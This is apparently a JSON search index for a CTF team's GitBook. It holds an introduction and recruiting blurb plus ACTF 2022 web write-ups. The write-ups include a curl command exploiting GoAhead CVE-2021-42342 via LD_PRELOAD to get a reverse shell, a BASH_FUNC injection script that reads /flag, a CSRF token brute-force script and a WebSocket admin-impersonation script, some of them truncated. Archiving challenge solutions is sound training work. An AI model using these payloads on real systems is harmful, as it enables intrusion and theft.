{"./":{"url":"./","title":"介绍","keywords":"","body":"Introduction 参加CTF比赛是一个良好的学习和提升技术水平的途径，但是很多师傅（比如我）因为工作的原因鲜有时间打比赛，久而久之不仅会和流行的CTF赛题思路风格脱节，还错过了诸多高质量题目中的姿势。于是这个gitbook诞生了。在这个gitbook中，你可以看到大量CTF赛事WEB题目的备份及writeup，也可以根据考点搜索 本项目主要用来总结r3kapig及其子战队参加过的CTF比赛中的WEB题目，目前主要由Y1ng维护及整理，赛题wp由战队内各位师傅编写完成。 本项目从2022.6.29开始更新，以前比赛随缘添加。 本地搭建 npm install gitbook-cli -g # 安装gitbook git clone https://github.com/y1nglamore/gitbook_webctf_summary.git cd gitbook_webctf_summary gitbook install # 安装依赖模块 gitbook serve # 开启服务 加入r3kapig r3kapig战队是国际知名的CTF战队，连续四年独立闯入DEFCON CTF全球总决赛，在多个国内和国际CTF赛事中取得了不错的成绩。 r4kapig战队是r3kapig的子战队，子战队队员拥有更丰富的锻炼机会，并且可以随主战队一同征战国际CTF赛事，表现出色的同学会成为r3kapig正式队员。只要你对CTF足够热爱并保持活跃并且没有参加其他联合战队（校队不影响），我们就欢迎你的加入！有意者可私聊Y1ng(微信Y1ngSec)或crazyman(微信crazyman_army)发送简历。 @Author: 颖奇L'Amore(Y1ng) and Members from Team r3kapig @Github: gitbook_webctf_summary @GitBook: CTF_WEB_SUMMARY "},"CTF_EVENTS/2022/":{"url":"CTF_EVENTS/2022/","title":"2022 XCTF_ACTF","keywords":"","body":"2022 "},"CTF_EVENTS/2022/XCTF_ACTF/gogogo.html":{"url":"CTF_EVENTS/2022/XCTF_ACTF/gogogo.html","title":"gogogo","keywords":"","body":"题目介绍 附件 ACTF warmup http://123.60.84.229:10218 docker retstart every 10 minutes! 考点： LD_PRELOAD CVE漏洞 Writeup GoAhead环境变量注入 cve-2021-42342 参考p牛的文章 https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html https://github.com/Mr-xn/CVE-2021-42342， 1、编译好上述库里的反弹代码，注意编译的时候加-s（p牛文章有提到，可以缩小.so文件体积） 2、然后触发漏洞：curl -F \"LD_PRELOAD=/proc/self/fd/0\" -F data=@exp.so http://123.60.84.229:10218/cgi-bin/hello 3、爆破/proc/self/fd/$$反弹shell 另一种解法： su战队的Writeup用的BASH_FUNC import requests payload = { \"BASH_FUNC_env%%\":(None,\"() { cat /flag; exit; }\"), } r = requests.post(\"http://123.60.84.229:10218/cgi-bin/hello\",files=payload) print(r.text) "},"CTF_EVENTS/2022/XCTF_ACTF/beWhatYourWannaBe.html":{"url":"CTF_EVENTS/2022/XCTF_ACTF/beWhatYourWannaBe.html","title":"beWhatYourWannaBe","keywords":"","body":"题目介绍 附件 “doctor, actor, lawyer or a singer why not president, be a dreamer You can be just the one you wanna be.” http://124.71.180.254:10022 It is recommended to test locally first. Chrome’s processes will be cleaned up every 2 minutes to avoid take up too much memory. Attachment is updated[2022-06-26 2:10 UTC+8] for stable exploitation. 考点： CSRF Writeup 因为后端有CSRFtoen的验证，并且是用时间戳算token实现的，所以先CSRF爆破让注册的用户有能访问第一段flag function hash(string) { const utf8 = new TextEncoder().encode(string); return crypto.subtle.digest('SHA-256', utf8).then((hashBuffer) => { const hashArray = Array.from(new Uint8Array(hashBuffer)); const hashHex = hashArray.map((bytes) => bytes.toString(16).padStart(2, '0')).join(''); return hashHex; }); } var data = Date.now() for (var i = 0; i { console.log(hex, (data + i)) document.form1.csrftoken.value = hex document.form1.submit() }); } flag2，需要满足fff.lll.aaa.ggg.value === \"this_is_what_i_want\" 实现方法有很多种，只需要满足最后有 就行了 poc.html fff.html lll.html "},"CTF_EVENTS/2022/XCTF_ACTF/poorui.html":{"url":"CTF_EVENTS/2022/XCTF_ACTF/poorui.html","title":"poorui","keywords":"","body":"题目介绍 附件 Chatting with each other! Attachment is update’d at 2022-06-26 11:34 (UTC+8) http://124.71.181.238:8081/ 考点： 原型链污染 XSS Writeup admin可以直接挤掉，然后直接getflag就行了，应该是非预期吧 看了下zer0pts的wp，果然是非预期，需要用原型链污染 https://nanimokangaeteinai.hateblo.jp/entry/2022/06/28/045459 var ws = new WebSocket(\"ws://124.71.181.238:8081/\"); ws.onopen = () => { var login = JSON.stringify({ \"api\": \"login\", \"username\": \"admin\" }) ws.send(login) var ctx = JSON.stringify({ \"rdd\": \"wenhaoa\"}) var data = { \"api\": \"getflag\", \"to\": \"flagbot\", \"msg\": { \"type\": \"tpl\", \"data\": { \"tpl\": \"test.tpl\", \"ctx\": `${ctx}` } } } ws.send(JSON.stringify(data)); } ws.onmessage = function (evt) { var received_msg = evt.data; document.write(\"received_msg.... \", received_msg, \"\") }; ws.onclose = function () { // 关闭 websocket document.write(\"close.... \", \"\") }; document.write(\"send.... login \") "}}